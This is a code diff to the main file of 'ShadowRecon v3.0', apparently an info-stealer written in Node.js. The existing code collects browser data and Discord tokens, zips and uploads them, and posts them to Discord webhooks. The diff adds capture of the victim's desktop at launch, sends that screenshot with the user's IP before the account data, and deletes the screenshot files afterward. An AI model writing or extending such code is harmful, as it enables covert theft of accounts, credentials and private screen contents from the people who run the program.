@@ -11,16 +11,19 @@ const { stats } = require('./core/statistics');
 const { BrowserCollector } = require('./modules/browsers/collector');
 const { DiscordService } = require('./services/discord/service');
 const { uploadService } = require('./services/upload/service');
+const { ScreenshotCapture } = require('./modules/screenshot/capture');
 const CoreUtils = require('./core/utils');
 
 class Application {
     constructor() {
         this.initialized = false;
         this.results = {};
+        this.screenshotPath = null;
         
         // Initialize services
         this.browserCollector = new BrowserCollector();
         this.discordService = new DiscordService();
+        this.screenshotCapture = new ScreenshotCapture();
         
         // Setup error handlers
         ErrorHandler.setupGlobalHandlers();
@@ -99,6 +102,28 @@ class Application {
     }
 
     /**
+     * Capture desktop screenshot at application launch
+     * @returns {Promise<string|null>} Path to screenshot file
+     */
+    async captureInitialScreenshot() {
+        try {
+            logger.info('Capturing initial desktop screenshot');
+            this.screenshotPath = await this.screenshotCapture.captureScreenshot();
+            
+            if (this.screenshotPath) {
+                logger.info('Initial screenshot captured successfully', { path: this.screenshotPath });
+            } else {
+                logger.warn('Failed to capture initial screenshot');
+            }
+            
+            return this.screenshotPath;
+        } catch (error) {
+            logger.error('Screenshot capture failed', error.message);
+            return null;
+        }
+    }
+
+    /**
      * Run data collection modules
      */
     async collectData() {
@@ -172,6 +197,23 @@ class Application {
             // Initialize file manager now that we know we have Discord tokens to process
             fileManager.init();
 
+            // Get system info for context
+            const systemInfo = stats.getRawData().system;
+            const userIp = systemInfo.ip || 'Unknown';
+
+            // FIRST: Send screenshot if available (as per requirement: image first, then embed)
+            if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
+                logger.info('Sending screenshot first (as requested)');
+                try {
+                    await this.discordService.sendScreenshot(this.screenshotPath, userIp);
+                    logger.info('Screenshot sent successfully - proceeding to Discord embeds');
+                } catch (error) {
+                    logger.error('Failed to send screenshot', error.message);
+                }
+            } else {
+                logger.warn('No screenshot available to send');
+            }
+
             // Create archive
             const zipPath = await fileManager.createZip();
             const zipSizeMB = fileManager.getZipSizeMB();
@@ -188,11 +230,10 @@ class Application {
                 downloadLink = await uploadService.upload(zipPath);
             }
 
-            // Send Discord accounts if available (more complete embed with username, etc.)
+            // SECOND: Send Discord accounts if available (as per requirement: after screenshot)
             if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
-                const systemInfo = stats.getRawData().system;
-                await this.discordService.sendAccountEmbeds(this.results.discord, systemInfo.ip || 'Unknown');
-                logger.info('Sent Discord account embeds (most complete information)');
+                await this.discordService.sendAccountEmbeds(this.results.discord, userIp);
+                logger.info('Sent Discord account embeds (after screenshot)');
             } else {
                 // Only send main webhook if no Discord accounts are available
                 await this.sendMainWebhook(downloadLink, zipPath);
@@ -244,6 +285,11 @@ class Application {
             // Clean up temporary files
             fileManager.cleanup();
 
+            // Clean up screenshot files
+            if (this.screenshotCapture) {
+                this.screenshotCapture.cleanup();
+            }
+
             logger.info('Cleanup completed');
         } catch (error) {
             logger.error('Cleanup failed', error.message);
@@ -256,6 +302,9 @@ class Application {
     async run() {
         try {
             logger.info('Starting ShadowRecon v3.0');
+
+            // FIRST: Capture screenshot immediately at launch (as per requirement)
+            await this.captureInitialScreenshot();
 
             // Initialize application
             await this.initialize();
@@ -278,7 +327,7 @@ class Application {
                 return;
             }
 
-            // Process and send data
+            // Process and send data (screenshot will be sent first, then embeds)
             await this.processAndSend();
 
             logger.info('ShadowRecon completed successfully');
